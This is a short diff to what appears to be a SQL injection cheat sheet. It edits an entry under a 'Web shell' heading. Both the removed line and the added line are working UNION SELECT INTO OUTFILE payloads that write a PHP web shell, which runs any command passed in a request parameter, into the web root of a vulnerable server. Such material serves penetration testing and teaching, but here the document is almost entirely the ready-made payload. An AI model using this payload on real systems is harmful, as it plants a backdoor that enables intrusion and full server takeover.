@@ -80,6 +80,6 @@ SELECT 'hello' INTO OUTFILE '/var/test.txt';
 
 ## Web shell
 ```sql
-' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- - 
+' union select 1,'<?php system($_REQUEST[0]); ?>',3 ,4 into outfile '/var/www/html/shell.php'-- - 
 ```
 
